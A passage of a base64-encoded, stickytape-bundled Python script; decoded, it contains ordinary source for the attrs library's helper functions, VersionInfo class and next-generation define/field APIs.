zXG5cbiAgICB3YXJuaW5ncy53YXJuKFxuICAgICAgICAiYXNzb2MgaXMgZGVwcmVjYXRlZCBhbmQgd2lsbCBiZSByZW1vdmVkIGFmdGVyIDIwMTgvMDEuIixcbiAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICBzdGFja2xldmVsPTIsXG4gICAgKVxuICAgIG5ldyA9IGNvcHkuY29weShpbnN0KVxuICAgIGF0dHJzID0gZmllbGRzKGluc3QuX19jbGFzc19fKVxuICAgIGZvciBrLCB2IGluIGl0ZXJpdGVtcyhjaGFuZ2VzKTpcbiAgICAgICAgYSA9IGdldGF0dHIoYXR0cnMsIGssIE5PVEhJTkcpXG4gICAgICAgIGlmIGEgaXMgTk9USElORzpcbiAgICAgICAgICAgIHJhaXNlIEF0dHJzQXR0cmlidXRlTm90Rm91bmRFcnJvcihcbiAgICAgICAgICAgICAgICAie2t9IGlzIG5vdCBhbiBhdHRycyBhdHRyaWJ1dGUgb24ge2NsfS4iLmZvcm1hdChcbiAgICAgICAgICAgICAgICAgICAgaz1rLCBjbD1uZXcuX19jbGFzc19fXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgKVxuICAgICAgICBfb2JqX3NldGF0dHIobmV3LCBrLCB2KVxuICAgIHJldHVybiBuZXdcblxuXG5kZWYgZXZvbHZlKGluc3QsICoqY2hhbmdlcyk6XG4gICAgIiIiXG4gICAgQ3JlYXRlIGEgbmV3IGluc3RhbmNlLCBiYXNlZCBvbiAqaW5zdCogd2l0aCAqY2hhbmdlcyogYXBwbGllZC5cblxuICAgIDpwYXJhbSBpbnN0OiBJbnN0YW5jZSBvZiBhIGNsYXNzIHdpdGggYGBhdHRyc2BgIGF0dHJpYnV0ZXMuXG4gICAgOnBhcmFtIGNoYW5nZXM6IEtleXdvcmQgY2hhbmdlcyBpbiB0aGUgbmV3IGNvcHkuXG5cbiAgICA6cmV0dXJuOiBBIGNvcHkgb2YgaW5zdCB3aXRoICpjaGFuZ2VzKiBpbmNvcnBvcmF0ZWQuXG5cbiAgICA6cmFpc2UgVHlwZUVycm9yOiBJZiAqYXR0cl9uYW1lKiBjb3VsZG5cJ3QgYmUgZm91bmQgaW4gdGhlIGNsYXNzXG4gICAgICAgIGBgX19pbml0X19gYC5cbiAgICA6cmFpc2UgYXR0ci5leGNlcHRpb25zLk5vdEFuQXR0cnNDbGFzc0Vycm9yOiBJZiAqY2xzKiBpcyBub3QgYW4gYGBhdHRyc2BgXG4gICAgICAgIGNsYXNzLlxuXG4gICAgLi4gIHZlcnNpb25hZGRlZDo6IDE3LjEuMFxuICAgICIiIlxuICAgIGNscyA9IGluc3QuX19jbGFzc19fXG4gICAgYXR0cnMgPSBmaWVsZHMoY2xzKVxuICAgIGZvciBhIGluIGF0dHJzOlxuICAgICAgICBpZiBub3QgYS5pbml0OlxuICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgYXR0cl9uYW1lID0gYS5uYW1lICAjIFRvIGRlYWwgd2l0aCBwcml2YXRlIGF0dHJpYnV0ZXMuXG4gICAgICAgIGluaXRfbmFtZSA9IGF0dHJfbmFtZSBpZiBhdHRyX25hbWVbMF0gIT0gIl8iIGVsc2UgYXR0cl9uYW1lWzE6XVxuICAgICAgICBpZiBpbml0X25hbWUgbm90IGluIGNoYW5nZXM6XG4gICAgICAgICAgICBjaGFuZ2VzW2luaXRfbmFtZV0gPSBnZXRhdHRyKGluc3QsIGF0dHJfbmFtZSlcblxuICAgIHJldHVybiBjbHMoKipjaGFuZ2VzKVxuXG5cbmRlZiByZXNvbHZlX3R5cGVzKGNscywgZ2xvYmFsbnM9Tm9uZSwgbG9jYWxucz1Ob25lLCBhdHRyaWJzPU5vbmUpOlxuICAgICIiIlxuICAgIFJlc29sdmUgYW55IHN0cmluZ3MgYW5kIGZvcndhcmQgYW5ub3RhdGlvbnMgaW4gdHlwZSBhbm5vdGF0aW9ucy5cblxuICAgIFRoaXMgaXMgb25seSByZXF1aXJlZCBpZiB5b3UgbmVlZCBjb25jcmV0ZSB0eXBlcyBpbiBgQXR0cmlidXRlYFwncyAqdHlwZSpcbiAgICBmaWVsZC4gSW4gb3RoZXIgd29yZHMsIHlvdSBkb25cJ3QgbmVlZCB0byByZXNvbHZlIHlvdXIgdHlwZXMgaWYgeW91IG9ubHlcbiAgICB1c2UgdGhlbSBmb3Igc3RhdGljIHR5cGUgY2hlY2tpbmcuXG5cbiAgICBXaXRoIG5vIGFyZ3VtZW50cywgbmFtZXMgd2lsbCBiZSBsb29rZWQgdXAgaW4gdGhlIG1vZHVsZSBpbiB3aGljaCB0aGUgY2xhc3NcbiAgICB3YXMgY3JlYXRlZC4gSWYgdGhpcyBpcyBub3Qgd2hhdCB5b3Ugd2FudCwgZS5nLiBpZiB0aGUgbmFtZSBvbmx5IGV4aXN0c1xuICAgIGluc2lkZSBhIG1ldGhvZCwgeW91IG1heSBwYXNzICpnbG9iYWxucyogb3IgKmxvY2FsbnMqIHRvIHNwZWNpZnkgb3RoZXJcbiAgICBkaWN0aW9uYXJpZXMgaW4gd2hpY2ggdG8gbG9vayB1cCB0aGVzZSBuYW1lcy4gU2VlIHRoZSBkb2NzIG9mXG4gICAgYHR5cGluZy5nZXRfdHlwZV9oaW50c2AgZm9yIG1vcmUgZGV0YWlscy5cblxuICAgIDpwYXJhbSB0eXBlIGNsczogQ2xhc3MgdG8gcmVzb2x2ZS5cbiAgICA6cGFyYW0gT3B0aW9uYWxbZGljdF0gZ2xvYmFsbnM6IERpY3Rpb25hcnkgY29udGFpbmluZyBnbG9iYWwgdmFyaWFibGVzLlxuICAgIDpwYXJhbSBPcHRpb25hbFtkaWN0XSBsb2NhbG5zOiBEaWN0aW9uYXJ5IGNvbnRhaW5pbmcgbG9jYWwgdmFyaWFibGVzLlxuICAgIDpwYXJhbSBPcHRpb25hbFtsaXN0XSBhdHRyaWJzOiBMaXN0IG9mIGF0dHJpYnMgZm9yIHRoZSBnaXZlbiBjbGFzcy5cbiAgICAgICAgVGhpcyBpcyBuZWNlc3Nhcnkgd2hlbiBjYWxsaW5nIGZyb20gaW5zaWRlIGEgYGBmaWVsZF90cmFuc2Zvcm1lcmBgXG4gICAgICAgIHNpbmNlICpjbHMqIGlzIG5vdCBhbiBgYGF0dHJzYGAgY2xhc3MgeWV0LlxuXG4gICAgOnJhaXNlIFR5cGVFcnJvcjogSWYgKmNscyogaXMgbm90IGEgY2xhc3MuXG4gICAgOnJhaXNlIGF0dHIuZXhjZXB0aW9ucy5Ob3RBbkF0dHJzQ2xhc3NFcnJvcjogSWYgKmNscyogaXMgbm90IGFuIGBgYXR0cnNgYFxuICAgICAgICBjbGFzcyBhbmQgeW91IGRpZG5cJ3QgcGFzcyBhbnkgYXR0cmlicy5cbiAgICA6cmFpc2UgTmFtZUVycm9yOiBJZiB0eXBlcyBjYW5ub3QgYmUgcmVzb2x2ZWQgYmVjYXVzZSBvZiBtaXNzaW5nIHZhcmlhYmxlcy5cblxuICAgIDpyZXR1cm5zOiAqY2xzKiBzbyB5b3UgY2FuIHVzZSB0aGlzIGZ1bmN0aW9uIGFsc28gYXMgYSBjbGFzcyBkZWNvcmF0b3IuXG4gICAgICAgIFBsZWFzZSBub3RlIHRoYXQgeW91IGhhdmUgdG8gYXBwbHkgaXQgKiphZnRlcioqIGBhdHRycy5kZWZpbmVgLiBUaGF0XG4gICAgICAgIG1lYW5zIHRoZSBkZWNvcmF0b3IgaGFzIHRvIGNvbWUgaW4gdGhlIGxpbmUgKipiZWZvcmUqKiBgYXR0cnMuZGVmaW5lYC5cblxuICAgIC4uICB2ZXJzaW9uYWRkZWQ6OiAyMC4xLjBcbiAgICAuLiAgdmVyc2lvbmFkZGVkOjogMjEuMS4wICphdHRyaWJzKlxuXG4gICAgIiIiXG4gICAgIyBTaW5jZSBjYWxsaW5nIGdldF90eXBlX2hpbnRzIGlzIGV4cGVuc2l2ZSB3ZSBjYWNoZSB3aGV0aGVyIHdlXCd2ZVxuICAgICMgZG9uZSBpdCBhbHJlYWR5LlxuICAgIGlmIGdldGF0dHIoY2xzLCAiX19hdHRyc190eXBlc19yZXNvbHZlZF9fIiwgTm9uZSkgIT0gY2xzOlxuICAgICAgICBpbXBvcnQgdHlwaW5nXG5cbiAgICAgICAgaGludHMgPSB0eXBpbmcuZ2V0X3R5cGVfaGludHMoY2xzLCBnbG9iYWxucz1nbG9iYWxucywgbG9jYWxucz1sb2NhbG5zKVxuICAgICAgICBmb3IgZmllbGQgaW4gZmllbGRzKGNscykgaWYgYXR0cmlicyBpcyBOb25lIGVsc2UgYXR0cmliczpcbiAgICAgICAgICAgIGlmIGZpZWxkLm5hbWUgaW4gaGludHM6XG4gICAgICAgICAgICAgICAgIyBTaW5jZSBmaWVsZHMgaGF2ZSBiZWVuIGZyb3plbiB3ZSBtdXN0IHdvcmsgYXJvdW5kIGl0LlxuICAgICAgICAgICAgICAgIF9vYmpfc2V0YXR0cihmaWVsZCwgInR5cGUiLCBoaW50c1tmaWVsZC5uYW1lXSlcbiAgICAgICAgIyBXZSBzdG9yZSB0aGUgY2xhc3Mgd2UgcmVzb2x2ZWQgc28gdGhhdCBzdWJjbGFzc2VzIGtub3cgdGhleSBoYXZlblwndFxuICAgICAgICAjIGJlZW4gcmVzb2x2ZWQuXG4gICAgICAgIGNscy5fX2F0dHJzX3R5cGVzX3Jlc29sdmVkX18gPSBjbHNcblxuICAgICMgUmV0dXJuIHRoZSBjbGFzcyBzbyB5b3UgY2FuIHVzZSBpdCBhcyBhIGRlY29yYXRvciB0b28uXG4gICAgcmV0dXJuIGNsc1xuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2F0dHIvX3ZlcnNpb25faW5mby5weScsIGInIyBTUERYLUxpY2Vuc2UtSWRlbnRpZmllcjogTUlUXG5cbmZyb20gX19mdXR1cmVfXyBpbXBvcnQgYWJzb2x1dGVfaW1wb3J0LCBkaXZpc2lvbiwgcHJpbnRfZnVuY3Rpb25cblxuZnJvbSBmdW5jdG9vbHMgaW1wb3J0IHRvdGFsX29yZGVyaW5nXG5cbmZyb20gLl9mdW5jcyBpbXBvcnQgYXN0dXBsZVxuZnJvbSAuX21ha2UgaW1wb3J0IGF0dHJpYiwgYXR0cnNcblxuXG5AdG90YWxfb3JkZXJpbmdcbkBhdHRycyhlcT1GYWxzZSwgb3JkZXI9RmFsc2UsIHNsb3RzPVRydWUsIGZyb3plbj1UcnVlKVxuY2xhc3MgVmVyc2lvbkluZm8ob2JqZWN0KTpcbiAgICAiIiJcbiAgICBBIHZlcnNpb24gb2JqZWN0IHRoYXQgY2FuIGJlIGNvbXBhcmVkIHRvIHR1cGxlIG9mIGxlbmd0aCAxLS00OlxuXG4gICAgPj4+IGF0dHIuVmVyc2lvbkluZm8oMTksIDEsIDAsICJmaW5hbCIpICA8PSAoMTksIDIpXG4gICAgVHJ1ZVxuICAgID4+PiBhdHRyLlZlcnNpb25JbmZvKDE5LCAxLCAwLCAiZmluYWwiKSA8ICgxOSwgMSwgMSlcbiAgICBUcnVlXG4gICAgPj4+IHZpID0gYXR0ci5WZXJzaW9uSW5mbygxOSwgMiwgMCwgImZpbmFsIilcbiAgICA+Pj4gdmkgPCAoMTksIDEsIDEpXG4gICAgRmFsc2VcbiAgICA+Pj4gdmkgPCAoMTksKVxuICAgIEZhbHNlXG4gICAgPj4+IHZpID09ICgxOSwgMiwpXG4gICAgVHJ1ZVxuICAgID4+PiB2aSA9PSAoMTksIDIsIDEpXG4gICAgRmFsc2VcblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE5LjJcbiAgICAiIiJcblxuICAgIHllYXIgPSBhdHRyaWIodHlwZT1pbnQpXG4gICAgbWlub3IgPSBhdHRyaWIodHlwZT1pbnQpXG4gICAgbWljcm8gPSBhdHRyaWIodHlwZT1pbnQpXG4gICAgcmVsZWFzZWxldmVsID0gYXR0cmliKHR5cGU9c3RyKVxuXG4gICAgQGNsYXNzbWV0aG9kXG4gICAgZGVmIF9mcm9tX3ZlcnNpb25fc3RyaW5nKGNscywgcyk6XG4gICAgICAgICIiIlxuICAgICAgICBQYXJzZSAqcyogYW5kIHJldHVybiBhIF9WZXJzaW9uSW5mby5cbiAgICAgICAgIiIiXG4gICAgICAgIHYgPSBzLnNwbGl0KCIuIilcbiAgICAgICAgaWYgbGVuKHYpID09IDM6XG4gICAgICAgICAgICB2LmFwcGVuZCgiZmluYWwiKVxuXG4gICAgICAgIHJldHVybiBjbHMoXG4gICAgICAgICAgICB5ZWFyPWludCh2WzBdKSwgbWlub3I9aW50KHZbMV0pLCBtaWNybz1pbnQodlsyXSksIHJlbGVhc2VsZXZlbD12WzNdXG4gICAgICAgIClcblxuICAgIGRlZiBfZW5zdXJlX3R1cGxlKHNlbGYsIG90aGVyKTpcbiAgICAgICAgIiIiXG4gICAgICAgIEVuc3VyZSAqb3RoZXIqIGlzIGEgdHVwbGUgb2YgYSB2YWxpZCBsZW5ndGguXG5cbiAgICAgICAgUmV0dXJucyBhIHBvc3NpYmx5IHRyYW5zZm9ybWVkICpvdGhlciogYW5kIG91cnNlbHZlcyBhcyBhIHR1cGxlIG9mXG4gICAgICAgIHRoZSBzYW1lIGxlbmd0aCBhcyAqb3RoZXIqLlxuICAgICAgICAiIiJcblxuICAgICAgICBpZiBzZWxmLl9fY2xhc3NfXyBpcyBvdGhlci5fX2NsYXNzX186XG4gICAgICAgICAgICBvdGhlciA9IGFzdHVwbGUob3RoZXIpXG5cbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIHR1cGxlKTpcbiAgICAgICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3JcblxuICAgICAgICBpZiBub3QgKDEgPD0gbGVuKG90aGVyKSA8PSA0KTpcbiAgICAgICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3JcblxuICAgICAgICByZXR1cm4gYXN0dXBsZShzZWxmKVs6IGxlbihvdGhlcildLCBvdGhlclxuXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHVzLCB0aGVtID0gc2VsZi5fZW5zdXJlX3R1cGxlKG90aGVyKVxuICAgICAgICBleGNlcHQgTm90SW1wbGVtZW50ZWRFcnJvcjpcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxuXG4gICAgICAgIHJldHVybiB1cyA9PSB0aGVtXG5cbiAgICBkZWYgX19sdF9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgdXMsIHRoZW0gPSBzZWxmLl9lbnN1cmVfdHVwbGUob3RoZXIpXG4gICAgICAgIGV4Y2VwdCBOb3RJbXBsZW1lbnRlZEVycm9yOlxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXG5cbiAgICAgICAgIyBTaW5jZSBhbHBoYWJldGljYWxseSAiZGV2MCIgPCAiZmluYWwiIDwgInBvc3QxIiA8ICJwb3N0MiIsIHdlIGRvblwndFxuICAgICAgICAjIGhhdmUgdG8gZG8gYW55dGhpbmcgc3BlY2lhbCB3aXRoIHJlbGVhc2VsZXZlbCBmb3Igbm93LlxuICAgICAgICByZXR1cm4gdXMgPCB0aGVtXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9fbmV4dF9nZW4ucHknLCBiJyMgU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVFxuXG4iIiJcblRoZXNlIGFyZSBQeXRob24gMy42Ky1vbmx5IGFuZCBrZXl3b3JkLW9ubHkgQVBJcyB0aGF0IGNhbGwgYGF0dHIuc2AgYW5kXG5gYXR0ci5pYmAgd2l0aCBkaWZmZXJlbnQgZGVmYXVsdCB2YWx1ZXMuXG4iIiJcblxuXG5mcm9tIGZ1bmN0b29scyBpbXBvcnQgcGFydGlhbFxuXG5mcm9tIC4gaW1wb3J0IHNldHRlcnNcbmZyb20gLl9mdW5jcyBpbXBvcnQgYXNkaWN0IGFzIF9hc2RpY3RcbmZyb20gLl9mdW5jcyBpbXBvcnQgYXN0dXBsZSBhcyBfYXN0dXBsZVxuZnJvbSAuX21ha2UgaW1wb3J0IChcbiAgICBOT1RISU5HLFxuICAgIF9mcm96ZW5fc2V0YXR0cnMsXG4gICAgX25nX2RlZmF1bHRfb25fc2V0YXR0cixcbiAgICBhdHRyaWIsXG4gICAgYXR0cnMsXG4pXG5mcm9tIC5leGNlcHRpb25zIGltcG9ydCBVbmFubm90YXRlZEF0dHJpYnV0ZUVycm9yXG5cblxuZGVmIGRlZmluZShcbiAgICBtYXliZV9jbHM9Tm9uZSxcbiAgICAqLFxuICAgIHRoZXNlPU5vbmUsXG4gICAgcmVwcj1Ob25lLFxuICAgIGhhc2g9Tm9uZSxcbiAgICBpbml0PU5vbmUsXG4gICAgc2xvdHM9VHJ1ZSxcbiAgICBmcm96ZW49RmFsc2UsXG4gICAgd2Vha3JlZl9zbG90PVRydWUsXG4gICAgc3RyPUZhbHNlLFxuICAgIGF1dG9fYXR0cmlicz1Ob25lLFxuICAgIGt3X29ubHk9RmFsc2UsXG4gICAgY2FjaGVfaGFzaD1GYWxzZSxcbiAgICBhdXRvX2V4Yz1UcnVlLFxuICAgIGVxPU5vbmUsXG4gICAgb3JkZXI9RmFsc2UsXG4gICAgYXV0b19kZXRlY3Q9VHJ1ZSxcbiAgICBnZXRzdGF0ZV9zZXRzdGF0ZT1Ob25lLFxuICAgIG9uX3NldGF0dHI9Tm9uZSxcbiAgICBmaWVsZF90cmFuc2Zvcm1lcj1Ob25lLFxuICAgIG1hdGNoX2FyZ3M9VHJ1ZSxcbik6XG4gICAgciIiIlxuICAgIERlZmluZSBhbiBgYGF0dHJzYGAgY2xhc3MuXG5cbiAgICBEaWZmZXJlbmNlcyB0byB0aGUgY2xhc3NpYyBgYXR0ci5zYCB0aGF0IGl0IHVzZXMgdW5kZXJuZWF0aDpcblxuICAgIC0gQXV0b21hdGljYWxseSBkZXRlY3Qgd2hldGhlciBvciBub3QgKmF1dG9fYXR0cmlicyogc2hvdWxkIGJlIGBUcnVlYFxuICAgICAgKGMuZi4gKmF1dG9fYXR0cmlicyogcGFyYW1ldGVyKS5cbiAgICAtIElmICpmcm96ZW4qIGlzIGBGYWxzZWAsIHJ1biBjb252ZXJ0ZXJzIGFuZCB2YWxpZGF0b3JzIHdoZW4gc2V0dGluZyBhblxuICAgICAgYXR0cmlidXRlIGJ5IGRlZmF1bHQuXG4gICAgLSAqc2xvdHM9VHJ1ZSogKHNlZSA6dGVybTpgc2xvdHRlZCBjbGFzc2VzYCBmb3IgcG90ZW50aWFsbHkgc3VycHJpc2luZ1xuICAgICAgYmVoYXZpb3JzKVxuICAgIC0gKmF1dG9fZXhjPVRydWUqXG4gICAgLSAqYXV0b19kZXRlY3Q9VHJ1ZSpcbiAgICAtICpvcmRlcj1GYWxzZSpcbiAgICAtICptYXRjaF9hcmdzPVRydWUqXG4gICAgLSBTb21lIG9wdGlvbnMgdGhhdCB3ZXJlIG9ubHkgcmVsZXZhbnQgb24gUHl0aG9uIDIgb3Igd2VyZSBrZXB0IGFyb3VuZCBmb3JcbiAgICAgIGJhY2t3YXJkcy1jb21wYXRpYmlsaXR5IGhhdmUgYmVlbiByZW1vdmVkLlxuXG4gICAgUGxlYXNlIG5vdGUgdGhhdCB0aGVzZSBhcmUgYWxsIGRlZmF1bHRzIGFuZCB5b3UgY2FuIGNoYW5nZSB0aGVtIGFzIHlvdVxuICAgIHdpc2guXG5cbiAgICA6cGFyYW0gT3B0aW9uYWxbYm9vbF0gYXV0b19hdHRyaWJzOiBJZiBzZXQgdG8gYFRydWVgIG9yIGBGYWxzZWAsIGl0IGJlaGF2ZXNcbiAgICAgICBleGFjdGx5IGxpa2UgYGF0dHIuc2AuIElmIGxlZnQgYE5vbmVgLCBgYXR0ci5zYCB3aWxsIHRyeSB0byBndWVzczpcblxuICAgICAgIDEuIElmIGFueSBhdHRyaWJ1dGVzIGFyZSBhbm5vdGF0ZWQgYW5kIG5vIHVuYW5ub3RhdGVkIGBhdHRycy5maWVsZHNgXFwgc1xuICAgICAgICAgIGFyZSBmb3VuZCwgaXQgYXNzdW1lcyAqYXV0b19hdHRyaWJzPVRydWUqLlxuICAgICAgIDIuIE90aGVyd2lzZSBpdCBhc3N1bWVzICphdXRvX2F0dHJpYnM9RmFsc2UqIGFuZCB0cmllcyB0byBjb2xsZWN0XG4gICAgICAgICAgYGF0dHJzLmZpZWxkc2BcXCBzLlxuXG4gICAgRm9yIG5vdywgcGxlYXNlIHJlZmVyIHRvIGBhdHRyLnNgIGZvciB0aGUgcmVzdCBvZiB0aGUgcGFyYW1ldGVycy5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMFxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMjEuMy4wIENvbnZlcnRlcnMgYXJlIGFsc28gcnVuIGBgb25fc2V0YXR0cmBgLlxuICAgICIiIlxuXG4gICAgZGVmIGRvX2l0KGNscywgYXV0b19hdHRyaWJzKTpcbiAgICAgICAgcmV0dXJuIGF0dHJzKFxuICAgICAgICAgICAgbWF5YmVfY2xzPWNscyxcbiAgICAgICAgICAgIHRoZXNlPXRoZXNlLFxuICAgICAgICAgICAgcmVwcj1yZXByLFxuICAgICAgICAgICAgaGFzaD1oYXNoLFxuICAgICAgICAgICAgaW5pdD1pbml0LFxuICAgICAgICAgICAgc2xvdHM9c2xvdHMsXG4gICAgICAgICAgICBmcm96ZW49ZnJvemVuLFxuICAgICAgICAgICAgd2Vha3JlZl9zbG90PXdlYWtyZWZfc2xvdCxcbiAgICAgICAgICAgIHN0cj1zdHIsXG4gICAgICAgICAgICBhdXRvX2F0dHJpYnM9YXV0b19hdHRyaWJzLFxuICAgICAgICAgICAga3dfb25seT1rd19vbmx5LFxuICAgICAgICAgICAgY2FjaGVfaGFzaD1jYWNoZV9oYXNoLFxuICAgICAgICAgICAgYXV0b19leGM9YXV0b19leGMsXG4gICAgICAgICAgICBlcT1lcSxcbiAgICAgICAgICAgIG9yZGVyPW9yZGVyLFxuICAgICAgICAgICAgYXV0b19kZXRlY3Q9YXV0b19kZXRlY3QsXG4gICAgICAgICAgICBjb2xsZWN0X2J5X21ybz1UcnVlLFxuICAgICAgICAgICAgZ2V0c3RhdGVfc2V0c3RhdGU9Z2V0c3RhdGVfc2V0c3RhdGUsXG4gICAgICAgICAgICBvbl9zZXRhdHRyPW9uX3NldGF0dHIsXG4gICAgICAgICAgICBmaWVsZF90cmFuc2Zvcm1lcj1maWVsZF90cmFuc2Zvcm1lcixcbiAgICAgICAgICAgIG1hdGNoX2FyZ3M9bWF0Y2hfYXJncyxcbiAgICAgICAgKVxuXG4gICAgZGVmIHdyYXAoY2xzKTpcbiAgICAgICAgIiIiXG4gICAgICAgIE1ha2luZyB0aGlzIGEgd3JhcHBlciBlbnN1cmVzIHRoaXMgY29kZSBydW5zIGR1cmluZyBjbGFzcyBjcmVhdGlvbi5cblxuICAgICAgICBXZSBhbHNvIGVuc3VyZSB0aGF0IGZyb3plbi1uZXNzIG9mIGNsYXNzZXMgaXMgaW5oZXJpdGVkLlxuICAgICAgICAiIiJcbiAgICAgICAgbm9ubG9jYWwgZnJvemVuLCBvbl9zZXRhdHRyXG5cbiAgICAgICAgaGFkX29uX3NldGF0dHIgPSBvbl9zZXRhdHRyIG5vdCBpbiAoTm9uZSwgc2V0dGVycy5OT19PUClcblxuICAgICAgICAjIEJ5IGRlZmF1bHQsIG11dGFibGUgY2xhc3NlcyBjb252ZXJ0ICYgdmFsaWRhdGUgb24gc2V0YXR0ci5cbiAgICAgICAgaWYgZnJvemVuIGlzIEZhbHNlIGFuZCBvbl9zZXRhdHRyIGlzIE5vbmU6XG4gICAgICAgICAgICBvbl9zZXRhdHRyID0gX25nX2RlZmF1bHRfb25fc2V0YXR0clxuXG4gICAgICAgICMgSG93ZXZlciwgaWYgd2Ugc3ViY2xhc3MgYSBmcm96ZW4gY2xhc3MsIHdlIGluaGVyaXQgdGhlIGltbXV0YWJpbGl0eVxuICAgICAgICAjIGFuZCBkaXNhYmxlIG9uX3NldGF0dHIuXG4gICAgICAgIGZvciBiYXNlX2NscyBpbiBjbHMuX19iYXNlc19fOlxuICAgICAgICAgICAgaWYgYmFzZV9jbHMuX19zZXRhdHRyX18gaXMgX2Zyb3plbl9zZXRhdHRyczpcbiAgICAgICAgICAgICAgICBpZiBoYWRfb25fc2V0YXR0cjpcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICAgICAgICAgICAgICJGcm96ZW4gY2xhc3NlcyBjYW5cJ3QgdXNlIG9uX3NldGF0dHIgIlxuICAgICAgICAgICAgICAgICAgICAgICAgIihmcm96ZW4tbmVzcyB3YXMgaW5oZXJpdGVkKS4iXG4gICAgICAgICAgICAgICAgICAgIClcblxuICAgICAgICAgICAgICAgIG9uX3NldGF0dHIgPSBzZXR0ZXJzLk5PX09QXG4gICAgICAgICAgICAgICAgYnJlYWtcblxuICAgICAgICBpZiBhdXRvX2F0dHJpYnMgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICByZXR1cm4gZG9faXQoY2xzLCBhdXRvX2F0dHJpYnMpXG5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgcmV0dXJuIGRvX2l0KGNscywgVHJ1ZSlcbiAgICAgICAgZXhjZXB0IFVuYW5ub3RhdGVkQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICByZXR1cm4gZG9faXQoY2xzLCBGYWxzZSlcblxuICAgICMgbWF5YmVfY2xzXCdzIHR5cGUgZGVwZW5kcyBvbiB0aGUgdXNhZ2Ugb2YgdGhlIGRlY29yYXRvci4gIEl0XCdzIGEgY2xhc3NcbiAgICAjIGlmIGl0XCdzIHVzZWQgYXMgYEBhdHRyc2AgYnV0IGBgTm9uZWBgIGlmIHVzZWQgYXMgYEBhdHRycygpYC5cbiAgICBpZiBtYXliZV9jbHMgaXMgTm9uZTpcbiAgICAgICAgcmV0dXJuIHdyYXBcbiAgICBlbHNlOlxuICAgICAgICByZXR1cm4gd3JhcChtYXliZV9jbHMpXG5cblxubXV0YWJsZSA9IGRlZmluZVxuZnJvemVuID0gcGFydGlhbChkZWZpbmUsIGZyb3plbj1UcnVlLCBvbl9zZXRhdHRyPU5vbmUpXG5cblxuZGVmIGZpZWxkKFxuICAgICosXG4gICAgZGVmYXVsdD1OT1RISU5HLFxuICAgIHZhbGlkYXRvcj1Ob25lLFxuICAgIHJlcHI9VHJ1ZSxcbiAgICBoYXNoPU5vbmUsXG4gICAgaW5pdD1UcnVlLFxuICAgIG1ldGFkYXRhPU5vbmUsXG4gICAgY29udmVydGVyPU5vbmUsXG4gICAgZmFjdG9yeT1Ob25lLFxuICAgIGt3X29ubHk9RmFsc2UsXG4gICAgZXE9Tm9uZSxcbiAgICBvcmRlcj1Ob25lLFxuICAgIG9uX3NldGF0dHI9Tm9uZSxcbik6XG4gICAgIiIiXG4gICAgSWRlbnRpY2FsIHRvIGBhdHRyLmliYCwgZXhjZXB0IGtleXdvcmQtb25seSBhbmQgd2l0aCBzb21lIGFyZ3VtZW50c1xuICAgIHJlbW92ZWQuXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMC4xLjBcbiAgICAiIiJcbiAgICByZXR1cm4gYXR0cmliKFxuICAgICAgICBkZWZhdWx0PWRlZmF1bHQsXG4gICAgICAgIHZhbGlkYXRvcj12YWxpZGF0b3IsXG4gICAgICAgIHJlcHI9cmVwcixcbiAgICAgICAgaGFzaD1oYXNoLFxuICAgICAgICBpbml0PWluaXQsXG4gICAgICAgIG1ldGFkYXRhPW1ldGFkYXRhLFxuICAgICAgICBjb252ZXJ0ZXI9Y29udmVydGVyLFxuICAgICAgICBmYWN0b3J5PWZhY3RvcnksXG4gICAgICAgIGt3X29ubHk9a3dfb25seSxcbiAgICAgICAgZXE9ZXEsXG4gICAgICAgIG9yZGVyPW9yZGVyLFxuICAgICAgICBvbl9zZXRhdHRyPW9uX3NldGF0dHIsXG4gICAgKVxuXG5cbmRlZiBhc2RpY3QoaW5zdCwgKiwgcmVjdXJzZT1UcnVlLCBmaWx0ZXI9Tm9uZSwgdmFsdWVfc2VyaWFsaXplcj1Ob25lKTpcbiAgICAiIiJcbiAgICBTYW1lIGFzIGBhdHRyLmFzZGljdGAsIGV4Y2VwdCB0aGF0IGNvbGxlY3Rpb25zIHR5cGVzIGFyZSBhbHdheXMgcmV0YWluZWRcbiAgICBhbmQgZGljdCBpcyBhbHdheXMgdXNlZCBhcyAqZGljdF9mYWN0b3J5Ki5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIxLjMuMFxuICAgICIiIlxuICAgIHJldHVybiBfYXNkaWN0KFxuICAgICAgICBpbnN0PWluc3QsXG4gICAgICAgIHJlY3Vyc2U9cmVjdXJzZSxcbiAgICAgICAgZmlsdGVyPWZpbHRlcixcbiAgICAgICAgdmFsdWVfc2VyaWFsaXplcj12YWx1ZV9zZXJpYWxpemVyLFxuICAgICAgICByZXRhaW5fY29sbGVjdGlvbl90eXBlcz1UcnVlLFxuICAgIClcblxuXG5kZWYgYXN0dXBsZShpbnN0LCAqLCByZWN1cnNlPVRydWUsIGZpbHRlcj1Ob25lKTpcbiAgICAiIiJcbiAgICBTYW1lIGFzIGBhdHRyLmFzdHVwbGVgLCBleGNlcHQgdGhhdCBjb2xsZWN0aW9ucyB0eXBlcyBhcmUgYWx3YXlzIHJldGFpbmVkXG4gICAgYW5k